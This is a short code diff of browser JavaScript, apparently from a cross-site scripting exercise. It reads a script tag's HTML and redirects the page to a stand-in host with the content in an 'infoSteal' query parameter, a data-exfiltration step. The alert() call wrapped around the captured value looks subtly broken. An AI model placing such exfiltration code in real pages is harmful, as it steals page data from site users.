@@ -20,7 +20,7 @@ function req1Listener() {
             var scriptContent = alert(firstScript.outerHTML); // or use textContent if you want the inner script text only
 
             // Send the script content to a specified URL
-            location = '//its-my-example.domain/log?infoSteal=' + encodeURIComponent(scriptContent);
+            window.location = '//its-my-example.domain/log?infoSteal=' + encodeURIComponent(scriptContent);
         } else {
             console.log("No script tag found within the target div.");
         }
